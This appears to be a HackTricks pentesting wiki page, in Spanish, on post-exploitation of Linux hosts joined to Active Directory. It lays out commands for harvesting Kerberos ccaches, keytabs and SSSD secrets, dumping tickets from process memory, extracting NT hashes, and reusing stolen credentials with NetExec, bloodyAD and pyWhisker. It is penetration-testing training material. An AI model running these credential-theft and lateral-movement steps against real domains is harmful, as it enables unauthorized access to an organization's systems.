# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una máquina Linux también puede estar presente dentro de un entorno de Active Directory.

Una máquina Linux dentro de un AD puede **almacenar material de Kerberos localmente**: ccaches de usuario, keytabs de máquina/servicio y secretos gestionados por SSSD. Estos artefactos normalmente se pueden reutilizar como cualquier otra credencial de Kerberos. Para leer la mayoría de ellos, deberás ser el usuario propietario del ticket o **root** en la máquina.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeración

### Enumeración de AD desde Linux

Si tienes acceso a un AD desde Linux (o a bash en Windows), puedes probar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar el AD.

También puedes consultar la siguiente página para conocer **otras formas de enumerar AD desde Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA es una **alternativa** open source a **Active Directory** de Microsoft Windows, principalmente para entornos **Unix**. Combina un **directorio LDAP** completo con un Centro de Distribución de Claves **Kerberos** de MIT para una gestión similar a Active Directory. Utilizando el **Certificate System** de Dogtag para la gestión de certificados de CA y RA, admite autenticación **multifactor**, incluidas las smartcards. SSSD está integrado para los procesos de autenticación de Unix.<sup>[[14]](#references)[[15]](#references)</sup> Obtén más información al respecto en:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefactos de hosts unidos al dominio

Antes de manipular tickets, identifica **cómo se unió el host a AD** y **dónde se almacena realmente el material de Kerberos**. En los hosts Linux modernos, esto suele gestionarse mediante `realmd` + `adcli` + `sssd`, no solo mediante archivos planos en `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Esto te indica rápidamente si el host confía en AD, si SSSD está almacenando en caché identidades o tickets, y si hay **machine/service keytabs** o **KCM secrets** disponibles para abusar de ellos.<sup>[[4]](#references)[[10]](#references)</sup>

## Jugar con tickets

### Pass The Ticket

En esta página encontrarás distintos lugares donde podrías **encontrar tickets de Kerberos dentro de un host Linux**. En la siguiente página puedes aprender a transformar estos formatos de tickets CCache a Kirbi (el formato que necesitas usar en Windows) y también a realizar un ataque PTT:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si quieres consultar los **flujos de trabajo específicos de Linux para recolectar tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), revisa la página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilización de tickets CCACHE desde /tmp

Los archivos CCACHE son formatos binarios para **almacenar credenciales de Kerberos**. `FILE:/tmp/krb5cc_%{uid}` sigue siendo común, pero las implementaciones modernas de Linux también utilizan `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` o `KCM:%{uid}`. Comprueba la variable de entorno **`KRB5CCNAME`** y la configuración `default_ccache_name` antes de asumir que los tickets se encuentran en `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Reutilización de tickets CCACHE desde el keyring

**Los tickets de Kerberos almacenados en la memoria de un proceso pueden extraerse**, especialmente cuando la protección ptrace de la máquina está deshabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Una herramienta útil para este propósito se encuentra en [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita la extracción inyectándose en las sesiones y volcando los tickets en `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Para configurar y utilizar esta herramienta, se siguen los pasos siguientes:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimiento intentará inyectarse en varias sesiones, indicando el éxito mediante el almacenamiento de tickets extraídos en `/tmp` con la convención de nombres `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Reutilización de tickets CCACHE desde SSSD KCM

SSSD mantiene una copia de la base de datos en la ruta `/var/lib/sss/secrets/secrets.ldb`. La clave correspondiente se almacena como un archivo oculto en la ruta `/var/lib/sss/secrets/.secrets.mkey`. De forma predeterminada, la clave solo se puede leer si tienes permisos de **root**.<sup>[[4]](#references)</sup>

Invocar **`SSSDKCMExtractor`** con los parámetros --database y --key analizará la base de datos y **descifrará los secretos**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
El extractor muestra cargas JSON sin procesar de Kerberos; conviértelas en una caché de tickets utilizable u otro formato de ticket antes de realizar operaciones de pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triaje rápido de keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extraer cuentas de /etc/krb5.keytab

Las claves de las cuentas de servicio, esenciales para los servicios que operan con privilegios de root, se almacenan de forma segura en archivos **`/etc/krb5.keytab`**. Estas claves, similares a las contraseñas de los servicios, requieren una estricta confidencialidad.<sup>[[5]](#references)</sup>

Para inspeccionar el contenido del archivo keytab, se puede emplear **`klist`**. En Linux, `klist -k -K -e` muestra los principals, los números de versión de las claves, los tipos de cifrado y el material de clave sin procesar. Si el tipo de clave es **23 / RC4-HMAC**, el valor de la clave también es el **hash NT** de ese principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Para los usuarios de Linux, **`KeyTabExtract`** ofrece funcionalidad para extraer el hash RC4 HMAC, que puede aprovecharse para reutilizar hashes NTLM. Ten en cuenta que esto solo ayuda cuando el keytab todavía contiene material **etype 23 / RC4-HMAC**. En entornos **AES-only**, es posible que no obtengas un hash NT reutilizable, pero aún puedes autenticarte directamente con el keytab mediante Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
En macOS, **`bifrost`** sirve como herramienta para el análisis de archivos keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando la información de cuentas y hashes extraída, se pueden establecer conexiones con servidores usando herramientas como **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Reutilizar la cuenta de máquina de `/etc/krb5.keytab`

En sistemas unidos mediante `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` suele contener la **cuenta de equipo** y uno o más **principals de host/servicio**. Si tienes **root**, no hagas simplemente un dump: usa uno de los principals enumerados por `klist -k` para solicitar un TGT y operar como el propio host Linux.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Esto es especialmente útil cuando el **objeto de equipo** tiene derechos delegados en AD o cuando el host puede recuperar otros secretos, como un **gMSA**.<sup>[[13]](#references)</sup>

### Reutilizar material de Kerberos robado con herramientas de AD orientadas a Linux

Una vez que tienes un `ccache` válido o un keytab utilizable, puedes operar contra AD **directamente desde Linux** sin convertir primero todo a formatos de Windows. Muchas herramientas modernas aceptan `KRB5CCNAME` / autenticación de Kerberos de forma nativa.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Esta es una buena conexión entre **Linux post-exploitation** y el **abuso de objetos de AD**. Para conocer las rutas de abuso a nivel de objeto, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefactos de Linux gMSA / Managed Service Account

Las implementaciones recientes de Linux pueden consumir **Managed Service Accounts** directamente desde AD. En la práctica, esto significa que, después de comprometer un servidor Linux, es posible encontrar no solo el keytab del host, sino también **keytabs específicos del servicio** generados a partir de un gMSA. Los lugares habituales que se deben inspeccionar son `/etc/gmsad.conf`, los archivos de configuración específicos de la implementación y archivos `*.keytab` adicionales bajo `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Esto te proporciona una identidad Kerberos reutilizable para los SPN asociados a esa gMSA **sin tocar ningún endpoint de Windows**.<sup>[[13]](#references)</sup> Para el abuso de gMSA/dMSA **del lado del dominio** después de obtener privilegios elevados en AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Acceso a AD con una cuenta de servicio administrada – Integración directa de sistemas RHEL con Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variables de entorno de Kerberos – Documentación de MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentación de MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Tipos de cifrado Kerberos RC4-HMAC utilizados por Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Uso de Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Descubrimiento y unión a dominios de identidad | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guía de usuario de bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Acerca de | Documentación de FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notas de la versión de FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentación del kernel de Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentación de MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
